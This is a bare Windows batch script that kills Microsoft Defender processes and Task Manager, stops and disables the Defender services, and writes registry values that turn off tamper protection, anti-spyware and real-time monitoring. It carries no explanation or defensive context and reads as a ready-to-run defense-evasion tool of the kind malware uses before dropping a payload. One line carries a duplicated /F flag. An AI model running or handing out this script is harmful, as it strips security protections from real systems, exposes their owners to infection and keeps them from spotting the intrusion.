@echo off
echo Killing MsMpEng...
taskkill /F /IM MsMpEng.exe
taskkill /F /IM MpDefenderCoreService.exe
taskkill /F /F /IM MsMpEng.exe
taskkill /F /IM Taskmgr.exe

echo Disabling Defender services...
sc stop WinDefend
sc config WinDefend start= disabled
sc stop WdNisSvc
sc config WdNisSvc start= disabled

echo Registry tweaks...
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f

echo Done!
pause
